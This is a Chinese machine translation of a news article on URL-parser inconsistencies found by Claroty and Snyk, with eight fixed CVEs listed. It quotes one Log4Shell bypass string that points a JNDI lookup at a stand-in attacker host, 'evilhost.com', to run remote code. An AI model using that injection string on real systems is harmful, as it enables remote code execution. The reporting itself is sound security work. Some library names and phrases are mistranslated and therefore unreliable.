# 研究人员在十多个广泛使用的 URL 解析器库中发现错误

一项对 16 种不同的统一资源定位器 ( URL ) 解析库的研究发现了不一致和混淆，可利用这些不一致和混淆绕过验证并为各种攻击向量打开大门。

在由网络安全公司Claroty 和 Synk联合进行的深入分析中，在许多用 C、JavaScript、PHP、Python 和 Ruby 语言编写并被多个 Web 应用程序使用的第三方库中发现了八个安全漏洞。

研究人员表示：“URL 解析中的混乱可能会导致软件（例如 Web 应用程序）出现意外行为，并可能被威胁参与者利用来导致拒绝服务条件、信息泄露或可能进行远程代码执行攻击。”在与黑客新闻分享的一份报告中说。

由于 URL 是一种基本机制，通过它可以请求和检索位于本地或 Web 上的资源，解析库如何解释 URL 请求的差异可能会给用户带来重大风险。

一个典型的例子是上个月在无处不在的 Log4j 日志框架中披露的关键Log4Shell 漏洞，该漏洞源于这样一个事实：恶意攻击者控制的字符串在被评估为由易受攻击的应用程序记录时会导致JNDI查找连接到攻击者操作的服务器并执行任意 Java 代码。

虽然Apache软件基金会（ASF）迅速投入在修复来解决的弱点，它很快就出现了缓解，可以绕过通过特制的输入格式为“$ {JNDI：LDAP：//127.0.0 \[。\] 1#.evilhost.com:1389/a}" 再次允许远程 JNDI 查找以实现代码执行。

“这种绕过源于这样一个事实，即在 JNDI 查找过程中使用了两个不同的 (!) URL 解析器，一个解析器用于验证 URL，另一个用于获取它，这取决于每个解析器如何处理片段部分 (#) URL 也发生了变化，”研究人员说。

![](../Images/9b8391471c5447462de7df3c9a89f4b3.png)

具体来说，如果输入被视为常规 HTTP URL，则权威组件（域名和端口号的组合）在遇到片段标识符时结束，而当被视为 LDAP URL 时，解析器将分配整个“127.0.0\[.\]1#.evilhost.com:1389”作为权威，因为 LDP URL 规范不考虑该片段。

事实上，使用多个解析器是发现这八个漏洞的两个主要原因之一，另一个是库遵循不同 URL 规范时出现的不一致问题，从而有效地引入了可利用的漏洞。

不和谐的范围从涉及包含反斜杠（“\\”）、不规则数量的斜杠（例如，https:///www.example\[.\]com）或URL 编码数据（“%”）的 URL 到缺少 URL 的 URL 的混淆方案，可以被利用来获得远程代码执行甚至阶段拒绝或服务（DoS）和开放重定向网络钓鱼攻击。

发现的八个漏洞列表如下，所有这些漏洞都已由各自的维护人员解决 -

*   Belledonne 的 SIP 堆栈 (C, CVE-2021-33056 )
    
*   Video.js（JavaScript，CVE-2021-23414）
    
*   Nagios XI (PHP, CVE-2021-37352 )
    
*   烧瓶安全性（Python，CVE-2021-23385）
    
*   Flask-security-too (Python, CVE-2021-32618 )
    
*   Flask \-unchained (Python, CVE-2021-23393 )
    
*   烧瓶用户（Python，CVE-2021-23401）
    
*   清除（Ruby，CVE-2021-23435）
    

“许多现实生活中的攻击场景可能来自不同的解析原语，”研究人员说。为了保护应用程序免受 URL 解析漏洞的影响，“有必要充分了解整个过程中涉及哪些解析器 \[以及\] 解析器之间的差异，无论是它们的宽大处理程度，它们如何解释不同格式错误的 URL，以及它们支持哪些类型的 URL 。”
